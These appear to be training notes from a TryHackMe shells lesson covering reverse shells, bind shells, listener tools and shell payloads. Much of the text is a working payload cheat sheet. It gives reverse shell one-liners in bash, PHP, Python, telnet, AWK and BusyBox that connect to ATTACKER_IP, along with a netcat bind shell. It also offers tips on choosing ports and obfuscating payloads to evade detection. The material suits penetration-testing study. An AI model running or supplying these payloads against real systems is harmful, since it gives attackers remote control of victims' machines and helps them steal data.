### **Shells**


#### **What is a Shell?**
- A **shell** is software that allows users to interact with an operating system (OS).
  - Can be **graphical** (GUI) or **command-line-based** (CLI).
  - In cybersecurity, a shell often refers to a **command-line interface** used by attackers to control compromised systems.

#### **Key Activities Enabled by Shells**
| Activity                  | Description                                                                 |
|---------------------------|-----------------------------------------------------------------------------|
| **Remote System Control** | Execute commands or run programs on the target system.                     |
| **Privilege Escalation**  | Explore vulnerabilities to gain higher privileges (e.g., root or admin).   |
| **Data Exfiltration**     | Search for and steal sensitive data (e.g., files, credentials).            |
| **Persistence**           | Maintain long-term access by creating backdoors or hidden accounts.        |
| **Post-Exploitation**     | Perform malicious activities like deploying malware or deleting evidence.  |
| **Pivoting**              | Use the compromised system to attack other systems on the network.         |


#### **Types of Shells**
Shells can vary based on how they are accessed and their capabilities:
1. **Reverse Shell**: The target system connects back to the attacker's machine.
2. **Bind Shell**: The target system opens a port and waits for the attacker to connect.
3. **Interactive Shell**: Allows full interaction with the system (e.g., running commands, navigating directories).
4. **Non-Interactive Shell**: Limited functionality, often used for specific tasks.


#### **-----**
Imagine a **shell** as a **remote control** for a compromised system:
- The attacker uses the remote control (**shell**) to:
  - Turn on/off features (**run commands**).
  - Unlock doors (**escalate privileges**).
  - Steal valuables (**exfiltrate data**).
  - Hide secret keys (**maintain access**).
  - Use the house as a base to break into neighboring houses (**pivot to other systems**).


#### **Key Takeaways**
1. **Shells Enable Control**: They allow attackers to interact with and control compromised systems.
2. **Types of Shells Matter**: Reverse shells and bind shells are common in attacks.
3. **Post-Exploitation is Key**: Shells are just the starting point for deeper attacks.
4. **Limit Shell Access**: Defenders should restrict shell access and monitor for suspicious activity.

---
---


### **Reverse Shells**

#### **What is a Reverse Shell?**
- A **reverse shell** is a technique where the **target system** initiates a connection back to the **attacker's machine**, allowing the attacker to gain control of the target.
- It is called "reverse" because the connection flows from the target to the attacker, bypassing firewalls and security measures that block incoming connections.


#### **Why Use Reverse Shells?**
- **Bypass Firewalls**: Many firewalls block incoming connections but allow outgoing connections. Reverse shells exploit this by having the target connect to the attacker.
- **Blend with Legitimate Traffic**: Attackers often use common ports (e.g., 80, 443) to disguise malicious traffic as normal web traffic.
- **Remote Access**: Allows attackers to execute commands and interact with the target system as if they were logged in locally.

#### **How Reverse Shells Work**
1. **Set Up a Listener**:
   - The attacker uses tools like **Netcat** (`nc`) to listen for incoming connections.
   - Example Command:
     ```bash
     nc -lvnp 443
     ```
     - `-l`: Listen for incoming connections.
     - `-v`: Verbose mode (shows detailed output).
     - `-n`: Disable DNS lookups (uses IP addresses directly).
     - `-p`: Specifies the port to listen on (e.g., `443`).

2. **Execute a Reverse Shell Payload**:
   - The attacker runs a payload on the target system to initiate the reverse shell.
   - Example Payload:
     ```bash
     rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP 443 >/tmp/f
     ```
     - **Breakdown**:
       1. `rm -f /tmp/f`: Removes any existing named pipe to avoid conflicts.
       2. `mkfifo /tmp/f`: Creates a named pipe for communication.
       3. `cat /tmp/f`: Reads data from the named pipe.
       4. `| sh -i 2>&1`: Pipes input to an interactive shell (`sh`), redirecting errors to standard output.
       5. `| nc ATTACKER_IP 443`: Sends the shell's output to the attacker's IP on port `443`.
       6. `>/tmp/f`: Sends the output back into the named pipe for bidirectional communication.

3. **Attacker Receives the Shell**:
   - Once the payload is executed, the attacker gains access to the target system via the reverse shell.
   - Example Output:
     ```
     connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
     target@tryhackme:~$
     ```

#### **Key Points**
| Component          | Description                                                                 |
|--------------------|-----------------------------------------------------------------------------|
| **Listener**       | The attacker sets up a listener using tools like Netcat (`nc`).            |
| **Payload**        | A script or command executed on the target to initiate the reverse shell.  |
| **Ports**          | Common ports like `80`, `443`, or `53` are used to blend with legitimate traffic. |
| **Bidirectional**  | Reverse shells allow both sending commands and receiving output.           |


#### **Story to Remember**
Imagine a **reverse shell** as a **spy radio**:
- The spy (target system) sends a signal back to the spy agency (attacker's machine).
- The spy agency listens for the signal using a **radio receiver** (`nc -lvnp`).
- Once the connection is established, the spy agency can send commands and receive updates from the spy.


#### **Key Takeaways**
1. **Reverse Shells Bypass Firewalls**: They work by initiating the connection from the target to the attacker.
2. **Common Ports Help Avoid Detection**: Use ports like `80`, `443`, or `53` to blend with normal traffic.
3. **Payloads Vary by OS and Tools**: Different payloads are used depending on the target system and available tools.
4. **Interactive Control**: Reverse shells allow attackers to run commands and interact with the target system.

---
---



### **Bind Shells**

#### **What is a Bind Shell?**
- A **bind shell** is a technique where the **target system** opens a port and listens for incoming connections from the attacker.
- Once the attacker connects to the open port, they gain access to a shell session on the target system.


#### **Why Use Bind Shells?**
- **Useful When Outgoing Connections Are Blocked**: If the target system cannot initiate outgoing connections (e.g., due to firewall rules), a bind shell allows the attacker to connect directly to the target.
- **Less Common**: Bind shells are less popular than reverse shells because they are easier to detect since the target actively listens for connections.


#### **How Bind Shells Work**
1. **Set Up the Bind Shell on the Target**:
   - The attacker runs a command on the target machine to create a bind shell.
   - Example Command:
     ```bash
     rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
     ```
     - **Breakdown**:
       1. `rm -f /tmp/f`: Removes any existing named pipe to avoid conflicts.
       2. `mkfifo /tmp/f`: Creates a named pipe for communication.
       3. `cat /tmp/f`: Reads data from the named pipe.
       4. `| bash -i 2>&1`: Pipes input to an interactive shell (`bash`), redirecting errors to standard output.
       5. `| nc -l 0.0.0.0 8080`: Starts Netcat in listen mode (`-l`) on all interfaces (`0.0.0.0`) and port `8080`.
       6. `>/tmp/f`: Sends the output back into the named pipe for bidirectional communication.

2. **Attacker Connects to the Bind Shell**:
   - The attacker uses tools like **Netcat** (`nc`) to connect to the target's open port.
   - Example Command:
     ```bash
     nc -nv TARGET_IP 8080
     ```
     - `-n`: Disables DNS resolution (uses IP addresses directly).
     - `-v`: Verbose mode (shows detailed connection information).
     - `TARGET_IP`: The IP address of the target machine.
     - `8080`: The port number where the bind shell is listening.

3. **Attacker Gains Access**:
   - Once connected, the attacker receives a shell session on the target system.
   - Example Output:
     ```
     (UNKNOWN) [10.10.13.37] 8080 (http-alt) open
     target@tryhackme:~$
     ```

#### **Key Points**
| Component          | Description                                                                 |
|--------------------|-----------------------------------------------------------------------------|
| **Bind Shell Setup** | The target listens for incoming connections on a specific port.           |
| **Listener**       | The target uses tools like Netcat (`nc`) to listen for connections.        |
| **Ports**          | Ports below `1024` require elevated privileges, so higher ports (e.g., `8080`) are often used. |
| **Connection**     | The attacker connects to the target's open port to gain shell access.      |


#### **-----**
Imagine a **bind shell** as a **doorbell**:
- The target system sets up a doorbell (`nc -l 0.0.0.0 8080`) and waits for someone to ring it.
- The attacker rings the doorbell (`nc -nv TARGET_IP 8080`) to gain access.
- Once the doorbell is rung, the target opens the door, allowing the attacker to enter and interact with the system.


#### **Key Takeaways**
1. **Bind Shells Listen for Connections**: The target opens a port and waits for the attacker to connect.
2. **Use Higher Ports**: Avoid using ports below `1024` to bypass privilege requirements.
3. **Easier to Detect**: Since the target actively listens for connections, bind shells are more likely to be detected by security tools.
4. **Interactive Control**: Once connected, the attacker can execute commands and interact with the target system.

---
---



### **Shell Listeners**


#### **What are Shell Listeners?**
- A **shell listener** is a tool or utility that waits for incoming connections from a compromised target and allows the attacker to interact with the shell.
- Common tools include **Netcat**, **Rlwrap**, **Ncat**, and **Socat**, each offering unique features for handling reverse or bind shells.


#### **Why Use Different Listeners?**
- **Enhanced Features**: Some tools provide additional functionality like encryption, history, or better interactivity.
- **Security**: Tools like **Ncat** support SSL/TLS encryption to secure the connection.
- **Flexibility**: Different listeners can handle specific scenarios better (e.g., verbosity, protocol support).


#### **Common Shell Listener Tools**

1. **Rlwrap**
   - **Purpose**: Enhances Netcat by adding keyboard editing and command history.
   - **Command**:
     ```bash
     rlwrap nc -lvnp 443
     ```
   - **Key Features**:
     - Allows use of arrow keys and history.
     - Improves usability for interactive shells.

2. **Ncat**
   - **Purpose**: An enhanced version of Netcat with additional features like SSL encryption.
   - **Basic Command**:
     ```bash
     ncat -lvnp 4444
     ```
   - **SSL Command**:
     ```bash
     ncat --ssl -lvnp 4444
     ```
   - **Key Features**:
     - Supports SSL encryption (`--ssl`).
     - Provides better security for sensitive data.
     - Part of the Nmap project.

3. **Socat**
   - **Purpose**: A versatile tool for creating socket connections between two hosts.
   - **Command**:
     ```bash
     socat -d -d TCP-LISTEN:443 STDOUT
     ```
   - **Key Features**:
     - `-d -d`: Increases verbosity for debugging.
     - `TCP-LISTEN:443`: Creates a TCP listener on port 443.
     - `STDOUT`: Directs incoming data to the terminal.
   - **Use Case**: Ideal for advanced reverse shells or encrypted connections.


#### **Comparison of Tools**
| Tool       | Key Features                                                                 | Best For                                      |
|------------|-----------------------------------------------------------------------------|-----------------------------------------------|
| **Netcat** | Simple and widely available.                                                | Basic reverse/bind shells.                   |
| **Rlwrap** | Adds history and keyboard editing to Netcat.                                | Interactive shells with better usability.    |
| **Ncat**   | SSL encryption, part of Nmap, more secure.                                  | Encrypted or secure reverse shells.          |
| **Socat**  | Versatile, supports advanced protocols and encryption.                      | Complex setups or encrypted connections.     |


#### **-----**
Imagine shell listeners as **different types of phones**:
- **Netcat**: A basic landline phone—simple and effective for most calls.
- **Rlwrap**: A landline with added features like caller ID and call history.
- **Ncat**: A secure phone with end-to-end encryption for private conversations.
- **Socat**: A high-tech satellite phone capable of handling complex communication needs.


#### **Key Takeaways**
1. **Choose the Right Tool**:
   - Use **Netcat** for simplicity.
   - Use **Rlwrap** for better interactivity.
   - Use **Ncat** for secure, encrypted connections.
   - Use **Socat** for advanced setups.
2. **Encryption Matters**: Use tools like **Ncat** or **Socat** to encrypt traffic when dealing with sensitive data.
3. **Verbosity Helps Debugging**: Use verbose modes (`-d -d` in Socat) to troubleshoot issues.
4. **Port Selection**: Choose ports wisely to avoid detection (e.g., `80`, `443`).

---
---



### **Shell Payloads**


#### **What are Shell Payloads?**
- A **shell payload** is a command or script that exposes a shell (e.g., `bash`, `sh`) to an attacker via a network connection.
- Payloads can be used for **reverse shells** (target connects to the attacker) or **bind shells** (attacker connects to the target).


#### **Why Use Different Payloads?**
- **Compatibility**: Some payloads work better depending on the target system's environment (e.g., available tools like `bash`, `php`, `python`).
- **Bypass Restrictions**: Payloads can be crafted to bypass security measures like firewalls, restricted shells, or disabled functions.
- **Encryption and Obfuscation**: Advanced payloads can hide malicious activity from detection.


#### **Common Shell Payloads**

1. **Bash Reverse Shells**
   - **Basic Bash Reverse Shell**:
     ```bash
     bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
     ```
     - Opens an interactive shell (`bash -i`) and redirects input/output through a TCP connection to the attacker.

   - **Bash with File Descriptor**:
     ```bash
     exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
     ```
     - Uses file descriptor `5` for bidirectional communication.

   - **Compact Bash Reverse Shell**:
     ```bash
     bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
     ```
     - Similar to the basic version but uses file descriptor `5`.

2. **PHP Reverse Shells**
   - **Using `exec`**:
     ```php
     php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
     ```
     - Creates a socket connection and executes a shell using `exec`.

   - **Using `shell_exec`**:
     ```php
     php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
     ```
     - Similar to `exec`, but uses `shell_exec`.

   - **Using `system`**:
     ```php
     php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
     ```
     - Executes commands and outputs results directly.

   - **Using `passthru`**:
     ```php
     php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
     ```
     - Sends raw output back to the attacker.

3. **Python Reverse Shells**
   - **Environment Variables**:
     ```bash
     export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
     ```
     - Sets remote host/port as variables and spawns a shell.

   - **Short Python Reverse Shell**:
     ```bash
     python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
     ```
     - Compact version of the above.

4. **Other Payloads**
   - **Telnet**:
     ```bash
     TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
     ```
     - Uses `telnet` and a named pipe for communication.

   - **AWK**:
     ```bash
     awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
     ```
     - Leverages AWK's built-in TCP capabilities.

   - **BusyBox**:
     ```bash
     busybox nc ATTACKER_IP 443 -e sh
     ```
     - Uses BusyBox's `nc` to execute `/bin/sh`.


#### **Key Points**
| Payload Type      | Key Features                                                                 | Best For                                      |
|-------------------|-----------------------------------------------------------------------------|-----------------------------------------------|
| **Bash**          | Simple, widely available on Linux systems.                                  | Quick reverse shells on Linux.               |
| **PHP**           | Works on web servers with PHP enabled.                                      | Web-based reverse shells.                    |
| **Python**        | Flexible, works on systems with Python installed.                           | Systems where Python is available.           |
| **Telnet/AWK**    | Lightweight, no need for additional tools.                                  | Minimal environments or restricted shells.   |
| **BusyBox**       | Compact, often found on embedded systems.                                   | Embedded devices or minimal Linux setups.    |


#### **-----**
Imagine shell payloads as **different types of keys**:
- Each key (payload) is designed to unlock a specific type of door (environment).
- Some doors require simple keys (`bash`), while others need advanced keys (`python`, `php`).
- The right key depends on the lock (target system).


#### **Key Takeaways**
1. **Choose Based on Environment**:
   - Use `bash` for Linux systems.
   - Use `php` for web servers.
   - Use `python` for systems with Python installed.
   - Use `busybox` for embedded devices.
2. **Test Compatibility**: Ensure the payload works in the target environment.
3. **Obfuscate When Needed**: Modify payloads to avoid detection by security tools.
4. **Use File Descriptors**: Redirecting input/output ensures proper interaction.

---
---



